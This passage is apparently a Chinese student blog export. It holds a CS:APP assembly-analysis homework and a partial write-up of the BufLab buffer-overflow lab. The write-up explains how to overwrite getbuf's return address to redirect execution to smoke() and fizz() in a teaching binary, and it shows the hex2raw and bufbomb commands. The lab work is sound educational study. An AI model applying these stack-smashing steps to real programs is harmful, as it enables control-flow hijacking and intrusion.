-    <url>/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
-    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业2"><a href="#深入理解计算机系统——课程作业2" class="headerlink" title="深入理解计算机系统——课程作业2"></a>深入理解计算机系统——课程作业2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>五一放假还有作业。。。</p>
-<p>课程作业2共有三个题，都是分析汇编代码</p>
-<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include &quot;stdio.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//define H ?  //定义常数H          //H=37</span></span><br><span class="line"><span class="comment">//define J ?  //定义常数J          //J=16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> array1[H][J]; </span><br><span class="line"><span class="keyword">int</span> array2[J][H]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    array1[x][y] = x+<span class="number">2</span>*y;</span><br><span class="line">    array2[y][x] = y-x*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>Ubuntu 32位</code>系统下经过<code>gcc</code>汇编后，得到的函数f汇编代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">pushl     %ebp            //ebp入栈</span><br><span class="line">movl     %esp, %ebp       //ebp设为现在的帧指针</span><br><span class="line">pushl     %ebx            //ebx入栈</span><br><span class="line">movl     8(%ebp), %ecx    //ecx= M(8+ebp)=x</span><br><span class="line">movl     12(%ebp), %edx   //edx= M(12+ebp)=y</span><br><span class="line">movl     12(%ebp), %eax   //eax= M(12+ebp)=y</span><br><span class="line">addl     %eax, %eax       //eax=2*eax=2*y</span><br><span class="line">addl     8(%ebp), %eax    //eax= M(8+ebp)+eax=x+2*y</span><br><span class="line">sall     $4, %ecx         //ecx=ecx*16=16*x</span><br><span class="line">leal     (%ecx,%edx), %edx  //edx= ecx+edx =16*x+y,so J=16</span><br><span class="line">movl     %eax, array1(,%edx,4)   //array1[edx]=eax</span><br><span class="line">movl     12(%ebp), %edx   //edx=M(12+ebp)=y</span><br><span class="line">movl     8(%ebp), %ebx    //ebx=M(8+ebp)=x</span><br><span class="line">movl     8(%ebp), %eax    //eax=M(8+ebp)=x</span><br><span class="line">imull     8(%ebp), %eax    //eax=eax*M(8+ebp)=x*x</span><br><span class="line">movl     12(%ebp), %ecx    //ecx=M(12+ebp)=y</span><br><span class="line">subl     %eax, %ecx       //ecx=ecx-eax=y-x*x</span><br><span class="line">movl     %edx, %eax       //eax=edx=y</span><br><span class="line">sall     $3, %eax          //eax=eax*8=8*y</span><br><span class="line">addl     %edx, %eax       //eax=eax+edx=8*y+y</span><br><span class="line">sall     $2, %eax         //eax=eax*4=9*y*4</span><br><span class="line">addl     %edx, %eax       //eax=edx+eax=36*y+y</span><br><span class="line">addl     %ebx, %eax        //eax=ebx+eax=37*y+x,so H=37</span><br><span class="line">movl     %ecx, array2(,%eax,4)   //array2[eax]=ecx=y-x*x</span><br><span class="line">popl     %ebx              //ebx出栈</span><br><span class="line">popl     %ebp              //ebp出栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>请分析每一行汇编代码的意义，并给出常数<code>H</code>和<code>J</code>的值。（20.0分）</p>
-<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码，</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aprod</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, x, y, z;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; （  <span class="number">1</span>  ）; （  <span class="number">2</span>  ）) &#123;       <span class="comment">//i&lt;(n-2)    i+=3</span></span><br><span class="line">        （  <span class="number">3</span>  ）;                           <span class="comment">//x=a[i]</span></span><br><span class="line">        （  <span class="number">4</span>  ）;                           <span class="comment">//y=a[i+1]</span></span><br><span class="line">        （  <span class="number">5</span>  ）;                           <span class="comment">//z=a[i+2]</span></span><br><span class="line">        （  <span class="number">6</span>  ）;                           <span class="comment">//r=r*x*y*z</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n; i++)</span><br><span class="line">        （  <span class="number">7</span>  ）;                           <span class="comment">//r=a[i]*r  </span></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在32位系统中用<code>gcc</code>编译后，函数<code>aprod</code>对应的汇编语言程序代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aprod:</span><br><span class="line">pushl     %ebp           //ebp入栈</span><br><span class="line">movl     %esp, %ebp      //ebp设为现在的帧指针</span><br><span class="line">subl     $32, %esp       //esp=esp-32，预留32字节给函数临时变量</span><br><span class="line">movl     $1, -20(%ebp)   //r=M(ebp-20)=1</span><br><span class="line">movl     $0, -4(%ebp)    //i=M(ebp-4)=0</span><br><span class="line">jmp      .l2             //无条件跳转到.l2</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">sall     $2, %eax        //eax=eax*4=i*4</span><br><span class="line">addl     8(%ebp), %eax   //eax=eax+M(8+ebp)=4i+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i]</span><br><span class="line">movl     %eax, -8(%ebp)  //x=M(ebp-8)=eax=a[i]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">addl     $1, %eax        //eax=eax+1=i+1</span><br><span class="line">sall     $2, %eax        //eax=eax*4=4*(i+1)</span><br><span class="line">addl     8(%ebp), %eax   //eax=M(8+ebp)=4*[i+1]+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i+1]</span><br><span class="line">movl     %eax, -12(%ebp) //y=M(ebp-12)=eax=a[i+1]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=(ebp-4)=i</span><br><span class="line">addl     $2, %eax        //eax=eax+2=i+2</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*(i+2)</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*(i+2)</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i+2]</span><br><span class="line">movl     %eax, -16(%ebp)  //z=M(-16+ebp)=eax=a[i+2]</span><br><span class="line">movl     -20(%ebp), %eax  //eax=M(-20+ebp)=r</span><br><span class="line">imull     -8(%ebp), %eax  //eax*=M(-8+ebp)=r*x</span><br><span class="line">imull     -12(%ebp), %eax //eax*=M(-12+ebp)=r*x*y</span><br><span class="line">imull     -16(%ebp), %eax  //eax*=M(-16+ebp)=r*x*y*z</span><br><span class="line">movl     %eax, -20(%ebp)  //r=M(-20+ebp)=eax=r*x*y*z</span><br><span class="line">addl     $3, -4(%ebp)     //i=M(-4+ebp)+=3=i+3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl     12(%ebp), %eax    //eax=M(12+ebp)=n</span><br><span class="line">subl     $2, %eax          //eax=eax-2=n-2</span><br><span class="line">cmpl     -4(%ebp), %eax    //compare eax=n-2 with M(ebp-4)=i</span><br><span class="line">jg       .l3               //eax=n-2 &gt; M(ebp-4)=i则跳转.l3</span><br><span class="line">jmp      .l4               //无条件跳转.l4</span><br><span class="line"></span><br><span class="line">.l5:</span><br><span class="line">movl     -4(%ebp), %eax   //eax=M(-4+ebp)=i</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*i</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*i</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i]</span><br><span class="line">movl     -20(%ebp), %edx   //edx=M(-20+ebp)=r</span><br><span class="line">imull     %edx, %eax      //eax=eax*edx=a[i]*r</span><br><span class="line">movl     %eax, -20(%ebp)   //r=M(-20+ebp)=eax=a[i]*r</span><br><span class="line">addl     $1, -4(%ebp)      //i=M(-4+ebp)+1</span><br><span class="line"></span><br><span class="line">.l4:</span><br><span class="line">movl     -4(%ebp), %eax    //eax=M(-4+ebp)=i</span><br><span class="line">cmpl     12(%ebp), %eax    //compare eax=i with M(12+ebp)=n</span><br><span class="line">jl       .l5               //eax=i &lt; M(12+ebp)=n则跳转</span><br><span class="line">movl     -20(%ebp), %eax   //eax=M(-20+ebp)=r，返回值为r</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
-<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//incl  ude &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">frac</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;           </span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">2</span>) <span class="keyword">return</span> ______;           <span class="comment">//a*a</span></span><br><span class="line">    <span class="keyword">return</span> _______;                  <span class="comment">//frac(a-2)+a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c= ______;                  <span class="comment">// frac(a+b)</span></span><br><span class="line">    <span class="keyword">return</span> ______;                  <span class="comment">// 2*c+b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">10</span>,j=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> k=sum(_______,______);       <span class="comment">//int k=sum(j-i,i++);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frac:</span><br><span class="line">pushl  %ebp             //ebp入栈</span><br><span class="line">movl  %esp, %ebp        //ebp=esp，设为当前的帧指针</span><br><span class="line">subl  $24, %esp         //esp=esp-24，预留24字节给临时变量</span><br><span class="line">cmpl  $1, 8(%ebp)       //compare a=M(8+ebp) with 1</span><br><span class="line">jg    .l2                //a=M(8+ebp) &gt; 1则跳转到.l2</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">imull  8(%ebp), %eax     //eax*=M(8+ebp)=a*a</span><br><span class="line">jmp   .l3                 //无条件跳转.l3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">subl  $2, %eax           //eax=eax-2=a-2</span><br><span class="line">movl  %eax, (%esp)        //M(esp)=eax=a-2</span><br><span class="line">call  frac               //递归fun(a-2)</span><br><span class="line">addl  8(%ebp), %eax       //eax=eax+M(8+ebp)=fun(a-2)+a</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum:</span><br><span class="line">pushl  %ebp              //ebp入栈</span><br><span class="line">movl  %esp, %ebp         //ebp=esp,设为现在的栈指针</span><br><span class="line">subl  $40, %esp          //esp=esp-40,预留40字节给临时变量</span><br><span class="line">movl  12(%ebp), %eax     //eax=M(ebp+12)=b</span><br><span class="line">movl  8(%ebp), %edx      //edx=M(ebp+8)=a</span><br><span class="line">addl  %edx, %eax         //eax=eax+edx=a+b</span><br><span class="line">movl  %eax, (%esp)       //M(esp)=eax=a+b</span><br><span class="line">call  frac               //调用frac(a+b)</span><br><span class="line">movl  %eax, -12(%ebp)    //c=M(ebp-12)=eax=frac(a+b)</span><br><span class="line">movl  -12(%ebp), %eax    //eax=M(ebp-12)=c</span><br><span class="line">addl  %eax, %eax         //eax=2*eax=2*c</span><br><span class="line">addl  12(%ebp), %eax     //eax=eax+M(ebp+12)=2*c+b</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">pushl  %ebp           //ebp入栈</span><br><span class="line">movl  %esp, %ebp      //ebp设为现在的栈指针</span><br><span class="line">andl  $-16, %esp      //esp=esp &amp; 0xfffffff0</span><br><span class="line">subl  $32, %esp       //esp=esp-32,预留32位字节给临时变量</span><br><span class="line">movl  $10, 20(%esp)   //i=M(20+esp)=10</span><br><span class="line">movl  $6, 24(%esp)    //j=M(24+esp)=6</span><br><span class="line">movl  20(%esp), %eax  //eax=M(20+esp)=i</span><br><span class="line">movl  24(%esp), %edx  //edx=M(24+esp)=j</span><br><span class="line">subl  %eax, %edx       //edx=edx-eax=j-i=-4</span><br><span class="line">movl  20(%esp), %eax   //eax=M(20+esp)=i=10</span><br><span class="line">addl  $1, 20(%esp)     //i=M(20+esp)+1=11</span><br><span class="line">movl  %edx, 4(%esp)    //M(4+esp)=edx=-4</span><br><span class="line">movl  %eax, (%esp)     //M(esp)=eax=10</span><br><span class="line">call  sum              //调用sum(j-i,i++)</span><br><span class="line">movl  %eax, 28(%esp)   //k=M(28+esp)=eax，将sum函数返回值赋给k</span><br><span class="line">movl  $0, %eax         //eax=0, return 0</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
-]]></content>
-      <categories>
-        <category>CS:APP</category>
-      </categories>
-      <tags>
-        <tag>课程作业</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统——LAB-4_BufLab</title>
-    <url>/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/</url>
-    <content><![CDATA[<h1 id="深入理解计算机系统——LAB-4-Buf-Lab"><a href="#深入理解计算机系统——LAB-4-Buf-Lab" class="headerlink" title="深入理解计算机系统——LAB-4_Buf_Lab"></a>深入理解计算机系统——LAB-4_Buf_Lab</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>缓冲区溢出实验。</strong></p>
-<p>要求学生们通过利用一个<strong>缓冲区溢出漏洞</strong>，来<strong>修改</strong>一个<strong>二进制可执行文件的运行时行为</strong>。</p>
-<p>这个实验教会学生们<strong>栈的原理</strong>，并让他们了解到写那种<strong>易于遭受缓冲区溢出攻击的代码</strong>的<strong>危险性</strong>。</p>
-<h2 id="实验环境和使用工具"><a href="#实验环境和使用工具" class="headerlink" title="实验环境和使用工具"></a>实验环境和使用工具</h2><ul>
-<li><p>主系统 <code>Windows10</code></p>
-</li>
-<li><p>子系统 <code>Windows Subsystem for Linux kali</code></p>
-</li>
-<li><p><code>gdb10.2.1</code>版本</p>
-</li>
-<li><p><code>objdump 2.35.2</code>版本</p>
-</li>
-<li><p><code>VS code</code>编辑器，下载了<code>x86 and x86_64 Assembly</code>插件，提供汇编代码高亮功能</p>
-</li>
-</ul>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="准备过程，查看buflab-writeup-pdf"><a href="#准备过程，查看buflab-writeup-pdf" class="headerlink" title="准备过程，查看buflab-writeup.pdf"></a>准备过程，查看<code>buflab-writeup.pdf</code></h3><p>一共有三个二进制<strong>可执行文件：</strong></p>
-<ul>
-<li><p><code>bufbomb</code>：你将攻击的缓冲区炸弹程序</p>
-<ul>
-<li><p>通过<code>int getbuf()</code>函数从输入中读取字符串</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>容量为32字符的<code>buf</code>字符数组</li>
-<li>其中调用<code>Gets(buf)</code>读取字符串（以<code>\n</code>或文件结束符作为终止符），并将其连同终止符存储到一个目标地址（<code>buf</code>数组中）</li>
-<li>如果字符串长度&lt;=31个字符则正常返回1，反之则返回错误</li>
-</ul>
-</li>
-<li><p><code>bufbomb</code>有几个命令行参数：</p>
-<ul>
-<li><code>-u userid</code>为指定的userid操作炸弹</li>
-<li><code>-h</code>打印命令行参数列表</li>
-<li><code>-n</code>在”Nitro”模式下操作，在Level 4中使用。</li>
-<li><code>-s</code>将解决方案提交给评分服务器</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><code>makecookie</code>：根据userid（用户id）生成一个“cookie”</p>
-<ul>
-<li><p>用法示例：</p>
- <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./makecookie bovik</span><br><span class="line"><span class="number">0x1005b2b7</span></span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>cookie是由8个十六进制数字组成的字符串，不出意外与userid一一对应</p>
-</li>
-<li><p>在五次缓冲区攻击中的四次攻击中，我们的目标是将cookie放在他一般不该出现的地方。</p>
-</li>
-</ul>
-</li>
-<li><p><code>hex2raw</code>：一个帮助在字符串格式之间进行转换的程序</p>
-<ul>
-<li><p>输入两个一组的16进制数字以空格或者换行符分隔，也就是16进制格式的exploit string，转换为ASCII码格式字符串。支持c语言风格的注释</p>
-</li>
-<li><p>你能通过设置一系列管道去通过<code>hex2raw</code>传递字符串：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik</span><br></pre></td></tr></table></figure></li>
-<li><p>你能存储原始字符串在一个文件，然后通过使用I/O重定向去提交给<code>bufbomb</code>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span><br><span class="line">unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt</span><br></pre></td></tr></table></figure>
-
-<p>在GDB调试内部也能使用这种方法：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; <span class="function">gdb <span class="title">bufbomb</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> run -u bovik &lt; exploit-raw.txt</span></span><br></pre></td></tr></table></figure></li>
-<li><p>注意</p>
-<ul>
-<li><code>0x0A</code>是换行符<code>\n</code>，它会终止字符串读取，所以不能包含<code>0x0A</code>。</li>
-<li>如果要创建字符串<code>0xDEADBEEF</code>，我们应该传递<code>EF BE AD DE</code></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>接下来是五个Level的说明</p>
-<h3 id="Level-0-Candle-10-pts"><a href="#Level-0-Candle-10-pts" class="headerlink" title="Level 0: Candle(10 pts)"></a>Level 0: Candle(10 pts)</h3><h4 id="Level-0说明："><a href="#Level-0说明：" class="headerlink" title="Level 0说明："></a>Level 0说明：</h4><p><code>getbuf</code>函数被<code>test</code>函数调用，<code>test</code>函数C语言代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"></span><br><span class="line">	val = getbuf();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">	<span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>函数调用顺序是<code>test()-&gt;getbuf()-&gt;test()</code>，我们的任务是将其改变为<code>test()-&gt;getbuf()-&gt;smoke()</code>，<code>smoke()</code>函数代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>作者给出的一些建议：</p>
-<ul>
-<li>为这个级别设计你的exploit string。你需要的所有信息都可以通过检查<code>BUFBOMB</code>的反汇编版本来确定。使用<code>objdump -d</code>获取其反汇编版本。</li>
-<li>注意字节顺序。</li>
-<li>可以用GDB去逐步执行最后<code>getbuf</code>最后几条指令，确保程序正在做正确的事情。</li>
-<li><code>buf</code>数组在<code>getbuf</code>栈帧中的位置取决于被用来去编译<code>bufbomb</code>程序的gcc的版本，因此我们必须去阅读一些汇编代码来确定它的真正位置</li>
-</ul>
-<h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><p>反汇编<code>bufbomb</code>程序得到其反汇编版本<code>bufbomb.asm</code></p>
-<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603102948513.png" alt="image-20210603102948513"></p>
-<p>查看<code>getbuf</code>函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08049262 &lt;getbuf&gt;:</span><br><span class="line"> 8049262:	55                   	push   %ebp</span><br><span class="line"> 8049263:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049265:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 804926b:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 804926e:	e8 bf f9 ff ff       	call   8048c32 &lt;Gets&gt;</span><br><span class="line"> 8049273:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 8049278:	c9                   	leave  </span><br><span class="line"> 8049279:	c3                   	ret    </span><br><span class="line"> 804927a:	90                   	nop</span><br><span class="line"> 804927b:	90                   	nop</span><br><span class="line"> 804927c:	90                   	nop</span><br><span class="line"> 804927d:	90                   	nop</span><br><span class="line"> 804927e:	90                   	nop</span><br><span class="line"> 804927f:	90                   	nop</span><br></pre></td></tr></table></figure>
-
-<p>我们可以看出<code>Gets</code>函数的参数，也就是<code>buf</code>数组的首地址是<code>ebp-0x28</code></p>
-<ul>
-<li>因为<code>0x28=40</code>，所以我们需要先存入40个字符到栈帧中去占用给临时变量预留的空间</li>
-<li>然后再存入4个字符去占用本该是旧的esp存的空间，</li>
-<li>最后构造4个字符去作为返回地址将返回地址修改为<code>smoke</code>函数的地址<code>0x08048e0a</code>，按照小端法排列。</li>
-</ul>
-<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603121223800.png" alt="image-20210603121223800"></p>
-<ul>
-<li>因为<code>0x0A</code>不能出现，所以我们修改成<code>0x0B</code>，同样能满足要求。</li>
-<li>最后得到的exploit string如图所示<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603174115683.png" alt="image-20210603174115683"></li>
-<li>验证，与预期结果符合，Level 0完成。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603192226913.png" alt="image-20210603192226913"></li>
-</ul>
-<h3 id="Level-1-Sparkler-10-pts"><a href="#Level-1-Sparkler-10-pts" class="headerlink" title="Level 1: Sparkler(10 pts)"></a>Level 1: Sparkler(10 pts)</h3><h4 id="Level-1说明："><a href="#Level-1说明：" class="headerlink" title="Level 1说明："></a>Level 1说明：</h4><p><code>bufbomb</code>文件有一个函数<code>fizz</code>，代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>与Level 0相似，我们的任务是让<code>bufbomb</code>去执行<code>fizz</code>函数而不是<code>test</code>函数</p>
-<p>不同的是，我们要给函数<code>fizz</code>传入一个参数<code>val</code>，这个参数<code>val</code>要等于userid对应的cookie。</p>
-<p>作者的建议：函数不会调用<code>fizz</code>函数，它只会执行它的代码。这对于我们想在栈帧中放置cookie的位置有提示。</p>
-<h4 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h4><ul>
-<li>查看<code>bufbomb</code>的汇编代码，<code>fizz</code>函数的地址是<code>0x08048daf</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603203218420.png" alt="image-20210603203218420"></li>
-<li>userid为07的cookie是<code>0x429c4151</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603204916203.png" alt="image-20210603204916203"></li>
-<li>将这两个写入Level 1的exploit string，中间的是一个无关4字节（<code>fizz</code>函数把它当做返回地址），结果如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213910804.png" alt="image-20210603213910804"></li>
-<li>验证，符合预期结果，Level 1完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213409034.png" alt="image-20210603213409034"></li>
-</ul>
-<h3 id="Level-2-Firecracker-15-pts"><a href="#Level-2-Firecracker-15-pts" class="headerlink" title="Level 2: Firecracker(15 pts)"></a>Level 2: Firecracker(15 pts)</h3><h4 id="Level-2说明："><a href="#Level-2说明：" class="headerlink" title="Level 2说明："></a>Level 2说明：</h4><p><code>bufbomb</code>文件有一个函数<code>bang</code>，代码如下</p>
